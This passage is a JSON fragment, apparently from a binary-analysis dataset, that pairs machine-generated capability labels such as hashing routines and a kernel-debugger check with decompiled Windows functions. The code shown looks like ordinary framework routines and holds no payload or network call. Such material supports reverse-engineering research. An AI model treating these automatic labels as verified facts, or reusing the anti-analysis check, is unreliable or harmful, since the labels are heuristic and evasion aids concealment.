            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint64_t fcn.14000b238(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    \n    iVar3 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar3 + 0xb8) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar3 + 0xbc) = CONCAT44(uVar2 >> 0x10, uVar2);\n    return iVar3 + 0x98;\n}\n",
        "token_count": 189
    },
    "14000e77": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint64_t fcn.14000e77c(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t *in_stack_00000028;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int32_t iStack24;\n    \n    if (arg2 < 0x2b) {\ncode_r0x00014000e7ca:\n        if (arg2 - 0x132 < 7) {\n            iStack24 = arg2 - 0x132;\n            iStack32 = arg3;\n            uVar1 = fcn.14000d994(arg1, 0xbc19, 0, auStack40);\n            return -(*in_stack_00000028 != 0) & uVar1;\n        }\ncode_r0x00014000e8a0:\n        uVar3 = 0;\n    }\n    else {\n        if ((0x2f < arg2) && (arg2 != 0x39)) {\n            if (arg2 == 0x4e) {\n                iStack32 = arg4;\n                uVar3 = fcn.14000f610(arg1, 0, *(arg4 + 0x10) | 0xbc4e0000, auStack40);\n                return uVar3;\n            }\n            if (arg2 == 0x111) {\n                iVar2 = fcn.14000f610(arg1, 0, arg3 >> 0x10 | 0xbd110000, 0);\n                if (iVar2 != 0) {\n                    if (in_stack_00000028 == NULL) {\n                        return 1;\n                    }\n                    *in_stack_00000028 = 1;\n                    return 1;\n                }\n                goto code_r0x00014000e8a0;\n            }\n            if ((arg2 < 0x114) || ((0x115 < arg2 && (arg2 != 0x210)))) goto code_r0x00014000e7ca;\n        }\n        uVar3 = fcn.14000d994(arg1, arg2 + 0xbc00, arg3, arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 508
    },
    "14000fad": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.14000fad4(ulong noname_0, ulong arg2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    uchar auStack200 [32];\n    uchar *puStack168;\n    uchar auStack152 [128];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack200;\n    uVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar6 = uVar3;\n    iVar7 = uVar3 >> 0x10;\n    if ((4 < iVar6) && (iVar8 = 5,  5 < iVar7)) {\n        if (0x20 < iVar6) {\n            iVar6 = 0x20;\n        }\n        iVar5 = iVar6 + 0xf >> 4;\n        iVar11 = (iVar5 * 0x10 + (iVar6 + -4) / 2) - iVar6;\n        if (0xc < iVar11) {\n            iVar11 = 0xc;\n        }\n        if (0x20 < iVar7) {\n            iVar7 = 0x20;\n        }\n        fcn.14001bd50(auStack152, 0xff, 0x80);\n        puVar10 = 0x140030f00;\n        puVar4 = auStack152 + (iVar7 + -6 >> 1) * iVar5 * 2;\n        do {\n            uVar1 = *puVar10;\n            puVar10 = puVar10 + 1;\n            uVar9 = ~(uVar1 << (iVar11 & 0x1f));\n            puVar4[1] = uVar9;\n            *puVar4 = uVar9 >> 8;\n            puVar4 = puVar4 + iVar5 * 2;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n        puStack168 = auStack152;\n        *0x1400533f0 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar6, iVar7, 1);\n        if (*0x1400533f0 == 0) {\n            *0x1400533f0 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n        }\n        fcn.14001b410(uStack24 ^ auStack200);\n        return;\n    }\n    fcn.140005e30();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 623
    },
    "1400151b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.1400151bc(int64_t lpCriticalSection)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint8_t *puVar4;\n    uint64_t uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x28);\n    iVar2 = *(lpCriticalSection + 4);\n    uVar8 = *(lpCriticalSection + 8);\n    if ((iVar2 <= uVar8) || ((*(*(lpCriticalSection + 0x10) + uVar8 * 0x10) & 1) != 0)) {\n        uVar8 = 1;\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar4 = *(lpCriticalSection + 0x10);\n            do {\n                puVar4 = puVar4 + 0x10;\n                if ((*puVar4 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n                uVar8 = uVar8 + 1;\n            } while (iVar7 < iVar2);\n        }\n        if (iVar2 <= uVar8) {\n            uVar9 = iVar2 + 0x20;\n            if (*(lpCriticalSection + 0x10) == 0) {\n                if (0xffffffff < uVar9 << 4) {\n                    fcn.140001010(0x80070057);\n                    pcVar3 = swi(3);\n                    uVar5 = (*pcVar3)();\n                    return uVar5;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(2);\n            }\n            else {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar6);\n                if (0xffffffff < uVar9 << 4) {\n                    fcn.140001010(0x80070057);\n                    pcVar3 = swi(3);\n                    uVar5 = (*pcVar3)();\n                    return uVar5;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)(uVar6, uVar9 << 4 & 0xffffffff, 0x2002);\n            }\n            if (iVar7 == 0) {\n                if (*(lpCriticalSection + 0x10) != 0) {\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                    (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar6);\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n                fcn.140005de8();\n                pcVar3 = swi(3);\n                uVar5 = (*pcVar3)();\n                return uVar5;\n            }\n            iVar7 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar7);\n            fcn.14001bd50(*(lpCriticalSection + 4) * 0x10 + iVar7, 0, uVar9 - *(lpCriticalSection + 4) << 4);\n            *(lpCriticalSection + 4) = uVar9;\n            *(lpCriticalSection + 0x10) = iVar7;\n        }\n    }\n    if (*(lpCriticalSection + 0xc) <= uVar8) {\n        *(lpCriticalSection + 0xc) = uVar8 + 1;\n    }\n    puVar1 = *(lpCriticalSection + 0x10) + uVar8 * 0x10;\n    *puVar1 = *puVar1 | 1;\n    *(lpCriticalSection + 8) = uVar8 + 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n    return uVar8;\n}\n",
        "token_count": 847
    },
    "1400175c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.1400175c0(int64_t arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uchar auStack120 [32];\n    uchar auStack88 [64];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack120;\n    if (arg2 != NULL) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar4 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar4 && uVar4 != *(arg1 + 0x40)) {\n            fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n        }\n        uVar1 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        *arg2 = uVar1;\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar4 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar4 && uVar4 != *(arg1 + 0x40)) {\n            fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n        }\n        uVar1 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        if ((uVar1 < 0x40) && (uVar3 = fcn.14001715c(arg1, auStack88, uVar1),  uVar3 == uVar1)) {\n            auStack88[uVar1] = 0;\n            fcn.140017558(auStack88);\n        }\n    }\n    fcn.14001b410(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 583
    },
    "14001784": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.140017840(int64_t arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    \n    if (arg2 < 0xffff) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar2 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = arg2;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    }\n    else {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar2 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = 0xffff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        if (arg2 < 0xffffffff) {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.140017da0(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 4;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.140017338(arg1);\n            }\n            **(arg1 + 0x38) = arg2;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n        }\n        else {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.140017da0(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 4;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.140017338(arg1);\n            }\n            **(arg1 + 0x38) = 0xffffffff;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.140017da0(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 8;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.140017338(arg1);\n            }\n            **(arg1 + 0x38) = arg2;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 8;\n        }\n    }\n    return;\n}\n",
        "token_count": 889
    },
    "14001798": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.14001798c(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    uint32_t *puVar4;\n    code *pcVar5;\n    uint64_t uVar6;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(4, *(arg1 + 0x18));\n        pcVar5 = swi(3);\n        uVar6 = (*pcVar5)();\n        return uVar6;\n    }\n    uVar6 = *(arg1 + 0x38) + 2;\n    if (*(arg1 + 0x40) <= uVar6 && uVar6 != *(arg1 + 0x40)) {\n        fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n    }\n    puVar3 = *(arg1 + 0x38);\n    uVar1 = *puVar3;\n    *(arg1 + 0x38) = puVar3 + 1;\n    if (uVar1 == 0xffff) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(4, *(arg1 + 0x18));\n            pcVar5 = swi(3);\n            uVar6 = (*pcVar5)();\n            return uVar6;\n        }\n        if (*(arg1 + 0x40) <= puVar3 + 3 && puVar3 + 3 != *(arg1 + 0x40)) {\n            fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 4);\n        }\n        puVar4 = *(arg1 + 0x38);\n        uVar2 = *puVar4;\n        uVar6 = uVar2;\n        *(arg1 + 0x38) = puVar4 + 1;\n        if (uVar2 == 0xffffffff) {\n            if ((*(arg1 + 0x20) & 1) == 0) {\n                fcn.140017da0(4, *(arg1 + 0x18));\n                pcVar5 = swi(3);\n                uVar6 = (*pcVar5)();\n                return uVar6;\n            }\n            if (*(arg1 + 0x40) <= puVar4 + 3 && puVar4 + 3 != *(arg1 + 0x40)) {\n                fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 8);\n            }\n            uVar6 = **(arg1 + 0x38);\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        }\n    }\n    else {\n        uVar6 = uVar1;\n    }\n    return uVar6;\n}\n",
        "token_count": 687
    },
    "140017a7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.140017a74(int64_t *lpString, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    ushort uVar2;\n    int64_t arg3;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*lpString);\n    uVar2 = *(lpString + 0xc);\n    if ((~*(arg2 + 0x20) & 1) == 0) {\n        fcn.140017da0(2, *(arg2 + 0x18));\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    uVar6 = *(arg2 + 0x38) + 2;\n    if (*(arg2 + 0x40) <= uVar6 && uVar6 != *(arg2 + 0x40)) {\n        fcn.140017338(arg2);\n    }\n    **(arg2 + 0x38) = uVar2;\n    *(arg2 + 0x38) = *(arg2 + 0x38) + 2;\n    if ((~*(arg2 + 0x20) & 1) == 0) {\n        fcn.140017da0(2, *(arg2 + 0x18));\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    uVar6 = *(arg2 + 0x38) + 2;\n    if (*(arg2 + 0x40) <= uVar6 && uVar6 != *(arg2 + 0x40)) {\n        fcn.140017338(arg2);\n    }\n    uVar7 = uVar4;\n    **(arg2 + 0x38) = uVar4;\n    *(arg2 + 0x38) = *(arg2 + 0x38) + 2;\n    arg3 = *lpString;\n    if ((uVar7 != 0) && (arg3 != 0)) {\n        if ((~*(arg2 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg2 + 0x18));\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        piVar1 = arg2 + 0x40;\n        uVar8 = *piVar1 - *(arg2 + 0x38);\n        if (uVar7 < uVar8) {\n            uVar8 = uVar7;\n        }\n        uVar6 = uVar8;\n        iVar5 = fcn.14001af18(*(arg2 + 0x38), *piVar1 - *(arg2 + 0x38), arg3, uVar6);\n        if (iVar5 != 0) {\n            if (iVar5 == 0xc) {\n                fcn.140005de8();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if (iVar5 != 0x50) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        *(arg2 + 0x38) = *(arg2 + 0x38) + uVar6;\n        uVar7 = uVar7 - uVar8;\n        if (uVar7 != 0) {\n            fcn.140017338(arg2);\n            uVar8 = uVar7 - uVar7 % *(arg2 + 0x28);\n            (**(**(arg2 + 0x30) + 0x70))(*(arg2 + 0x30), arg3 + uVar6, uVar8);\n            uVar7 = uVar7 - uVar8;\n            if (*(arg2 + 0xc) != 0) {\n                (**(**(arg2 + 0x30) + 0xa0))(*(arg2 + 0x30), 1, *(arg2 + 0x28), arg2 + 0x48, piVar1);\n                *(arg2 + 0x38) = *(arg2 + 0x48);\n            }\n            if (*(arg2 + 0x28) <= uVar7) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if (*(arg2 + 0x38) != *(arg2 + 0x48)) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar5 = fcn.14001af18(*(arg2 + 0x38), uVar7, arg3 + uVar6 + uVar8, uVar7);\n            if (iVar5 != 0) {\n                if (iVar5 == 0xc) {\n                    fcn.140005de8();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                    fcn.140005e30();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if (iVar5 != 0x50) {\n                    fcn.140005e30();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n            *(arg2 + 0x38) = *(arg2 + 0x38) + uVar7;\n        }\n    }\n    return;\n}\n",
        "token_count": 1340
    },
    "14001848": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong fcn.14001848c(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint32_t *arg1_00;\n    ulong uVar5;\n    \n    *(arg1 + 1) = arg3;\n    if (arg3 <= arg3 + 0x40) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n        *arg1 = iVar4;\n        if (iVar4 != 0) {\n            arg1_00 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n            iVar2 = fcn.14001af18(arg1_00, *(arg1 + 1), arg2, *(arg1 + 1));\n            if (iVar2 != 0) {\n                if (iVar2 == 0xc) {\n                    fcn.140005de8();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n                if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n                if (iVar2 != 0x50) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n            }\n            if (*(arg1_00 + 2) == -1) {\n                uVar3 = arg1_00[3];\n            }\n            else {\n                uVar3 = *arg1_00;\n            }\n            *(arg1 + 0xc) = ~(uVar3 >> 6) & 1;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*arg1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 454
    },
    "140019b9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.140019b9c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    \n    if (arg2 == 0) {\n        fcn.140017da0(6, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(1, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (*(arg2 + 0xc) == 0xffff) {\n        fcn.140005e0c();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.140019a0c(arg1, 0);\n    puVar4 = fcn.140015b8c(*(arg1 + 0x58), arg2);\n    uVar1 = *puVar4;\n    uVar3 = ~*(arg1 + 0x20);\n    if (uVar1 == 0) {\n        if ((uVar3 & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = 0xffff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        fcn.140017a74(arg2, arg1);\n        fcn.140019450(arg1);\n        uVar1 = *(arg1 + 0x50);\n        puVar6 = fcn.140015b8c(*(arg1 + 0x58), arg2);\n        *puVar6 = uVar1;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        if ((uVar3 & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = uVar1 | 0x8000;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    }\n    else {\n        if ((uVar3 & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = 0x7fff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 4;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = uVar1 | 0x80000000;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n    }\n    return;\n}\n",
        "token_count": 1081
    },
    "14001a0c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.14001a0c0(int64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    ulong arg2_00;\n    uint64_t *puVar5;\n    \n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(2, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.140019a0c(arg1, 0);\n    if (arg2 == NULL) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar3 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = 0;\n    }\n    else {\n        puVar4 = fcn.140015b8c(*(arg1 + 0x58), arg2);\n        uVar1 = *puVar4;\n        if (uVar1 == 0) {\n            arg2_00 = (***arg2)(arg2);\n            fcn.140019b9c(arg1, arg2_00);\n            fcn.140019450(arg1);\n            uVar1 = *(arg1 + 0x50);\n            puVar5 = fcn.140015b8c(*(arg1 + 0x58), arg2);\n            *puVar5 = uVar1;\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n            (**(*arg2 + 0x10))(arg2, arg1);\n            return;\n        }\n        if (0x7ffe < uVar1) {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.140017da0(2, *(arg1 + 0x18));\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uVar3 = *(arg1 + 0x38) + 2;\n            if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n                fcn.140017338(arg1);\n            }\n            **(arg1 + 0x38) = 0x7fff;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n            if ((~*(arg1 + 0x20) & 1) != 0) {\n                uVar3 = *(arg1 + 0x38) + 4;\n                if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n                    fcn.140017338(arg1);\n                }\n                **(arg1 + 0x38) = uVar1;\n                *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n                return;\n            }\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar3 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n            fcn.140017338(arg1);\n        }\n        **(arg1 + 0x38) = uVar1;\n    }\n    *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    return;\n}\n",
        "token_count": 1001
    },
    "14002607": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.140026074(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int64_t iVar8;\n    uchar auStackX32 [8];\n    uchar auStack56 [8];\n    uint8_t uStack48;\n    \n    iVar2 = fcn.14001d3f8();\n    iVar8 = 0;\n    if (*0x140054620 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x1400342d0);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        *0x140054620 = sub.KERNEL32.dll_EncodePointer(iVar4);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x1400342c0);\n        *0x140054628 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x1400342a8);\n        *0x140054630 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetUserObjectInformationA\");\n        *0x140054640 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        if (*0x140054640 != 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetProcessWindowStation\");\n            *0x140054638 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        }\n    }\n    if ((*0x140054638 != iVar2) && (*0x140054640 != iVar2)) {\n        pcVar6 = sub.KERNEL32.dll_DecodePointer(*0x140054638);\n        pcVar7 = sub.KERNEL32.dll_DecodePointer(*0x140054640);\n        if (((pcVar6 != NULL) && (pcVar7 != NULL)) &&\n           (((iVar3 = (*pcVar6)(),  iVar3 == 0 || (iVar1 = (*pcVar7)(iVar3, 1, auStack56, 0xc, auStackX32),  iVar1 == 0)\n             ) || ((uStack48 & 1) == 0)))) {\n            arg3._0_4_ = arg3 | 0x200000;\n            goto code_r0x00014002622e;\n        }\n    }\n    if ((((*0x140054628 != iVar2) && (pcVar6 = sub.KERNEL32.dll_DecodePointer(),  pcVar6 != NULL)) &&\n        (iVar8 = (*pcVar6)(),  iVar8 != 0)) &&\n       ((*0x140054630 != iVar2 && (pcVar6 = sub.KERNEL32.dll_DecodePointer(),  pcVar6 != NULL)))) {\n        iVar8 = (*pcVar6)(iVar8);\n    }\ncode_r0x00014002622e:\n    pcVar6 = sub.KERNEL32.dll_DecodePointer(*0x140054620);\n    if (pcVar6 == NULL) {\n        return 0;\n    }\n    uVar5 = (*pcVar6)(iVar8, arg1, arg2, arg3);\n    return uVar5;\n}\n",
        "token_count": 806
    },
